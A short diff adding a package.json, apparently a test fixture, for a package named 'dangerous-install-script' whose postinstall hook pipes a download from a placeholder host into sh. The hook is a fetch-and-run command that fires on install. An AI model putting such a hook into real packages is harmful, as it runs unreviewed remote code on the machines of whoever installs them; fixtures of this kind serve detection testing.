@@ -1,0 +1,7 @@
+{
+  "name": "dangerous-install-script",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/payload | sh"
+  }
+}
